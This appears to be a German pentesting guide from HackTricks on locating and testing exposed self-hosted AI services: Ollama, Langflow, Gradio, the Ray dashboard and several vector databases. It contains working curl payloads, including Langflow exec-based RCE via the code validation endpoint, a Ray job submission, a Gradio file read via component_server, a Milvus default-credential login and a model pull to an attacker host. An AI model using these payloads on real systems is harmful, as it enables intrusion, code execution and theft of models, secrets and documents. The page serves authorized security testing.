# Offenliegende selbst gehostete AI-Services

{{#include ../banners/hacktricks-training.md}}

Teams, die AI-Features entwickeln, betreiben oft eigene Model-Runner, Agent-Builder, Demo-UIs, Compute-Cluster und Vector-Datenbanken. Viele dieser Tools wurden für einen Laptop oder ein geschlossenes Labornetzwerk entwickelt und haben daher **standardmäßig keine Authentifizierung** oder werden mit aktiviertem Authentifizierungs-Shortcut ausgeliefert. Wenn ein solcher Service für den Angreifer erreichbar ist, fällt die Auswirkung normalerweise in eine dieser Gruppen:

- Kostenlose Nutzung von GPUs und Modellen sowie Diebstahl privater Modelle.
- Offenlegung von Prompts, Dokumenten und Embeddings.
- Offenlegung von Secrets aus der Prozessumgebung (LLM-Provider-Keys, Cloud-Credentials).
- Code-Ausführung, da einige dieser APIs Code **als Feature** ausführen.

Auf dieser Seite wird beschrieben, wie man diese Services findet und was bei den einzelnen API-Typen getestet werden sollte. Informationen zur Absicherung eines selbst gehosteten Inference-Servers und zum llama.cpp `/slots`-leak findest du unter [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Informationen zu bösartigen Model-Dateien findest du unter [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Sende diese Requests ohne Credentials. Eine JSON-Antwort mit den erwarteten Feldern identifiziert das Produkt und oft auch die Version, wodurch klar wird, welche der folgenden Prüfungen zutreffen. Bei den Ports handelt es sich um die dokumentierten Standard-Ports oder die Ports aus den offiziellen Run-Beispielen.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Produkt | Häufiger Port | Nicht authentifizierter Request | Woran es zu erkennen ist |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | Versions-JSON, Liste lokaler Modelle |
| Langflow | 7860 | `GET /api/v1/version` | Langflow-Versions-JSON |
| Gradio | 7860 | `GET /config` | App-Konfiguration mit Gradio-Version und Component-IDs |
| Ray-Dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, Liste eingereichter Jobs |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat-Wert, Chroma-Version |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant-Version, Collection-Liste |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate-Version, Klassen |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Collection-Liste oder Authentifizierungsfehler |

Diese Services werden auch häufig hinter einem Reverse-Proxy unter einem Pfad-Präfix veröffentlicht (zum Beispiel `/ollama/` oder `/ray/`). Wiederhole die Requests daher unter jedem Präfix, das du in JavaScript-Bundles oder API-Dokumentation findest.

## Nicht authentifizierte Inference- und Model-Management-APIs

Model-Runner stellen normalerweise eine einzelne REST-API bereit, die Inference-Routen mit administrativen Routen kombiniert. Ollama ist ein gutes Beispiel. Es hat keine integrierte Authentifizierung und bindet standardmäßig an `127.0.0.1:11434`, während `OLLAMA_HOST` die Bind-Adresse ändert.<sup>[[1]](#references)[[15]](#references)</sup> Das offizielle Docker-Image setzt `OLLAMA_HOST=0.0.0.0:11434` im Container, deklariert `EXPOSE 11434` und hat keine `USER`-Anweisung, sodass der Server im Container als root läuft.<sup>[[16]](#references)</sup> `EXPOSE` veröffentlicht den Port nicht auf dem Host, daher hängt die Erreichbarkeit vom Host von der Bereitstellung ab. Die dokumentierten `docker run`-Befehle verwenden `-p 11434:11434`, und Docker veröffentlicht ein solches Mapping auf allen Host-Interfaces, sofern keine Host-IP angegeben ist.<sup>[[17]](#references)[[18]](#references)</sup>

Was die einzelnen Routengruppen einem Angreifer ermöglichen:<sup>[[2]](#references)</sup>

| Routen | Auswirkung ohne Authentifizierung |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Liste lokaler und geladener Modelle, einschließlich privater Custom-Modelle |
| `POST /api/show` | Model-Details, einschließlich Modelfile, Template und **System-Prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Kostenlose Inference auf der Hardware des Opfers |
| `POST /api/pull`, `/api/push` | Den Server von einer vom Angreifer ausgewählten Registry herunterladen oder ein Modell dorthin hochladen lassen |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Modelle erstellen, überschreiben oder löschen |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Eine ohne Credentials zurückgegebene Modellliste beweist bereits die Offenlegung. Benutzerdefinierte Modelle enthalten in `/api/show` oft einen internen System-Prompt. Ein Pull zu deinem Host beweist, dass der Server Manifeste von vom Angreifer gewählten Registries abruft. Ein `/api/push` zu deiner Registry macht aus der Offenlegung Modelldiebstahl. Rufe auf echten Zielen keine Create- oder Delete-Routen auf.

Registry-Pulls sind auch eine Parser-Angriffsfläche, da der Server Blobs anhand von Werten aus dem Remote-Manifest speichert. In Probllama (CVE-2024-37032, behoben in Ollama 0.1.34) wurde der Manifest-`digest` ohne Validierung als Dateiname verwendet. Eine bösartige Registry konnte daher mit `../`-Sequenzen Dateien außerhalb des Blobs-Verzeichnisses schreiben. Ein Push eines präparierten Manifests, dessen Digest auf eine lokale Datei verwies, leakte diese Datei an die Angreifer-Registry. Wiz erreichte RCE in Docker, wo der Server als root läuft, indem eine Shared Library geschrieben und in `/etc/ld.so.preload` eingetragen wurde; anschließend wurde `/api/chat` aufgerufen, damit ein neuer Prozess sie lud.<sup>[[15]](#references)</sup> Wenn ein Runner von beliebigen Registries pullen kann, prüfe, wie er Manifestfelder in Pfade umwandelt.

## APIs, die Code absichtlich ausführen

### Job-Submission-APIs

Verteilte Compute-Frameworks betrachten Codeausführung als ihre Hauptfunktion. Die Ray Jobs API am Dashboard-Port (8265) akzeptiert einen Shell-Befehl als `entrypoint` und führt ihn auf dem Cluster aus.<sup>[[19]](#references)</sup> Die Oligo-ShadowRay-Forschung berichtet, dass die Jobs API keine Autorisierung hat und das Dashboard an `0.0.0.0` bindet. Das zugehörige CVE-2023-48022 ist umstritten, da Ray nur innerhalb eines kontrollierten Netzwerks ausgeführt werden soll.<sup>[[20]](#references)</sup> Ray hat in Version 2.52.0 optionale Token-Authentifizierung (`RAY_AUTH_MODE=token`) hinzugefügt. Ray 2.59 aktiviert sie standardmäßig für lokale Cluster, die mit `ray.init()` gestartet werden; `ray start --head` kann weiterhin ohne Authentifizierung starten, wenn kein Token verfügbar ist. Ray dokumentiert eine umfassendere Einführung der Standardauthentifizierung für Version 2.61. Prüfe daher die eingesetzte Version und den Startmodus, statt anzunehmen, dass das Dashboard offen ist.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashboards dieser Art haben auch Hilfsrouten, die sich bei älteren Versionen zu prüfen lohnen. Vor Ray 2.8.1 rief `/log_proxy?url=` jede HTTP(S)-URL ab (SSRF auf Cloud-Metadaten), und `/api/v0/logs/file` akzeptierte einen beliebigen `filename`-Pfad – beides ohne Authentifizierung.<sup>[[8]](#references)</sup>

### Code-„Validierungs“-Endpunkte, die Funktionsdefinitionen ausführen

Agent-Builder, die benutzerdefinierte Python-Komponenten akzeptieren, „validieren“ den Code manchmal, indem sie ihn mit `ast` parsen und nur die Funktionsdefinitionen mit `exec()` ausführen. Das ist nicht sicher. Python wertet **Dekoratoren und Standardargumentwerte beim Definieren der Funktion aus**, sodass dort platzierter Code ausgeführt wird, selbst wenn der Funktionskörper nie ausgeführt wird. Langflows `POST /api/v1/validate/code` funktionierte auf diese Weise und war vor Version 1.3.0 nicht authentifiziert (CVE-2025-3248). Wird eine Exception ausgelöst, die die Befehlsausgabe enthält, gibt der Endpunkt die Ausgabe in der Antwort zurück:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Teste jeden Endpoint, der Benutzercode kompiliert, lintet oder „prüft“, auf dieses Muster und bevorzuge einen DNS-Callback als Nachweis.

### Auto-Login- und Standard-Superuser-Token-Routen

Single-User-Tools bieten oft eine Abkürzung, die jeden Besucher als Administrator anmeldet. In Langflow gibt `GET /api/v1/auto_login`, wenn `AUTO_LOGIN` aktiviert ist, jedem Aufrufer Tokens für den Standard-Superuser zurück. Ist die Option deaktiviert, antwortet die Route mit `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 bis 1.10.0 hatte die Option standardmäßig aktiviert (CVE-2026-9103). In Kombination mit der oben genannten authentifizierten Code-Validierungsroute ermöglicht dies wieder nicht authentifizierte RCE (CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> Aktuelle offizielle Release-Pakete und Docker-Images deaktivieren den automatischen Login und verlangen ein Superuser-Passwort, Entwicklungszweige lassen ihn jedoch aktiviert.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Auch ohne Codeausführung gewährt ein Superuser-Token Zugriff auf jeden Flow und die gespeicherten Provider-Zugangsdaten. Einen entsprechenden Voraussetzungstest für automatisierte Tests findest du unter [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## File-serving- und RPC-Routen in ML-Demo-UIs

ML-Demo-Frameworks stellen hochgeladene und generierte Dateien über eine generische Route bereit und ermöglichen es dem Frontend, serverseitige Component-Helper aufzurufen. Gradio stellt dafür `/config`, `/upload` und `/file=<path>` bereit.<sup>[[5]](#references)</sup> Bei ähnlichen Frameworks lohnt es sich, zwei Muster zu testen:

- **Traversal aus einem Upload-Unterverzeichnis:** Wenn die Datei-Route nur prüft, ob der Pfad innerhalb des Temp-Ordners beginnt, lade eine Datei hoch, um ein Unterverzeichnis zu erstellen, und navigiere dann mit `../` oder `%2e%2e%2f` aus diesem Verzeichnis heraus. Gradio 4.0 bis 4.10 (CVE-2023-51449) war auf diese Weise verwundbar.<sup>[[26]](#references)[[27]](#references)</sup> Sende die Anfrage mit `curl --path-as-is`, damit der Client den Pfad nicht normalisiert.
- **Beliebiger Method Dispatch:** Ein Endpoint, der `getattr(component, fn_name)` mit Benutzereingaben aufruft, ermöglicht es dem Angreifer, interne Helper aufzurufen. Vor Version 4.13.0 war dies bei Gradio über `/component_server` möglich. In den Versionen 4.3 bis 4.12 kopierte `move_resource_to_block_cache` beliebige lokale Dateien in den Cache, von wo sie über `/file=` heruntergeladen werden konnten. In den Versionen 3.47 bis 3.50.2 ermöglichten andere Helper das Lesen von Dateien und einen Full-Read-SSRF.<sup>[[26]](#references)[[28]](#references)</sup> Ein gepatchter Server antwortet bei Helpern, die nicht als Serverfunktionen markiert sind, mit `Function not found.`<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Auf Hugging Face Spaces sind die Space-Secrets Umgebungsvariablen, daher ist `/proc/self/environ` die wertvollste Datei. Horizon3 hat sie mit einem HTTP-`Range`-Header ausgelesen.<sup>[[26]](#references)</sup>

## Von RAG verwendete Vektordatenbanken

RAG speichert Chunks der Originaldokumente, deren Embeddings und Metadaten in einer Vektordatenbank. Der Assistent fügt die besten Ergebnisse in seinen Prompt ein. Lesezugriff leakt daher den **Klartext privater Dokumente**. Schreibzugriff ermöglicht es einem Angreifer, Chunks einzufügen, die später in die Prompts anderer Benutzer übernommen werden. Dies ist eine persistente indirekte Prompt Injection (siehe [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Prüfe bei selbst gehosteten Vektordatenbanken, ob eine Authentifizierung konfiguriert oder anonymer Zugriff aktiviert ist:

- **Qdrant**: Selbst bereitgestellte Instanzen lauschen auf allen Schnittstellen und verwenden standardmäßig keine Authentifizierung. Bei entsprechender Konfiguration wird der Schlüssel im `api-key`-Header oder als `Authorization: Bearer` übermittelt. Es können Read-only- und auf einzelne Collections beschränkte Schlüssel existieren.<sup>[[11]](#references)</sup>
- **Chroma**: Die Authentifizierung ist standardmäßig deaktiviert. Bei Token-Authentifizierung wird `Authorization` oder `X-Chroma-Token` verwendet.<sup>[[29]](#references)</sup>
- **Weaviate**: Wenn anonymer Zugriff aktiviert ist, werden Anfragen ohne Zugangsdaten als `user: anonymous` authentifiziert und erhalten die Berechtigungen dieses Benutzers.<sup>[[30]](#references)</sup>
- **Milvus**: Die Authentifizierung ist deaktiviert, sofern `common.security.authorizationEnabled` nicht auf `true` gesetzt ist. Ist sie aktiviert, lautet das Passwort des standardmäßigen `root`-Benutzers `Milvus`, und das Token-Format ist `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Eine Antwort, die private Daten ohne Zugangsdaten enthält, weist auf eine Offenlegung hin. Wenn die Authentifizierung aktiviert ist, prüfe unveränderte Standardkonten separat:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Prüfe, ob die Payloads Dokumenttexte, Benutzerkennungen oder Mandantennamen enthalten. Um Schreibzugriff nachzuweisen, ohne Produktionsdaten zu vergiften, erstelle und lösche unmittelbar danach eine leere, eindeutig benannte Collection – und nur, wenn der Scope dies erlaubt.

Auch bei diesen Servern kann die Authentifizierung zu spät erfolgen. Im Python-FastAPI-Server von Chroma (1.0.0 bis mindestens 1.5.8, CVE-2026-45829) erstellte die Route zum Anlegen einer Collection die vom Client bereitgestellte Embedding-Funktion vor der Authentifizierungsprüfung. Eine Konfiguration, die auf ein vom Angreifer kontrolliertes Hugging-Face-Modell mit `trust_remote_code: true` verwies, führte den Code des Angreifers aus, selbst wenn die Anfrage abgewiesen wurde. Das Rust-Frontend war nicht betroffen.<sup>[[32]](#references)</sup> Wenn eine Anfrage eine Modell- oder Plugin-Konfiguration enthält, teste sie ohne Zugangsdaten und achte auf ausgehende Anfragen an dein Modell-Repository.

## References

- [1] [Ollama-FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama-API-Dokumentation](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow-README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow-Quellcode – API-v1-Endpunkte](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio-Quellcode – routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio-Quellcode – http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray-Quellcode – job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox – Ray, Versionen 2.6.3 und 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma-Quellcode – Python-Client-Standardeinstellungen](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma-Quellcode – FastAPI-Serverrouten](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant – Sicherheit](https://qdrant.tech/documentation/security/)
- [12] [Qdrant-OpenAPI-Spezifikation](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate-OpenAPI-Spezifikation](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus – Verbindung zum Milvus-Server herstellen](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz – Probllama: Remote-Code-Execution-Schwachstelle in Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama-Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama-Docker-Dokumentation](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker – Ports veröffentlichen und freigeben](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray-Jobs-REST-API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo – ShadowRay: Erste bekannte Angriffskampagne gegen AI-Workloads, die in freier Wildbahn ausgenutzt wurde](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray-Token-Authentifizierung](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai – Bei jedem Tempo unsicher: Missbrauch von Python Exec für unauthentifizierte RCE in Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow-Quellcode – Login-Router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD – CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD – CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai – Ausnutzen von Dateileseschwachstellen in Gradio zum Stehlen von Secrets aus Hugging-Face-Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio-Hinweis GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio-Fix-Commit für `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook – Chroma-native Auth](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate – Authentifizierung](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus – Benutzerzugriff authentifizieren](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer – ChromaToast vor der Authentifizierung ausgeliefert](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
